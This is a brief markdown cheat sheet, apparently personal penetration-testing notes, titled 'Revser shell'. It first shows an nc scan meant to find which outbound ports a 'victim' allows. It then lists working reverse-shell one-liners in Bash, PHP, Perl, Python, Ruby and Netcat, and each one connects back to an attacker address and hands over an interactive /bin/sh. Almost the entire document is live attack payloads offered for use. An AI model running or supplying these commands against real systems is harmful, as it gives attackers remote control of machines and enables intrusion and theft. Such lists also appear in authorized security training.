# Revser shell
**1. Check which port is allowed for reverse shell** 

	sometime certain out going traffic is blocked by your victim   
	nc -nvv -w 1 -z "Your IP Address" 1-100  
	open Wireshark  

**2. Reverse shell list**  

	Bash  
	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

	Php  
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

	Perl  
	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

	Python  
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

	Ruby  
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

	Netcat  
	nc -e /bin/sh 10.0.0.1 1234
	(Really like this one)
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
